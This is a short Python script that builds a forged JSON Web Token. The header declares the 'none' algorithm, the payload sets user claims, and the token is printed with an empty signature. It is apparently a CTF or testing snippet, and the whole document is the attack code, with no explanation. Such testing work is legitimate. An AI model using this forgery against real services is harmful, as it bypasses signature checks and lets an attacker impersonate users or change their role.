import base64
def jwtBase64Encode(x):
    return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
header = '''{
  "alg": "none",
  "typ": "JWT"
}'''
payload = '''{
  "sub": "a",
  "name": "a",
  "role": "user",
  "iat": 1787402300333
}'''
print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')
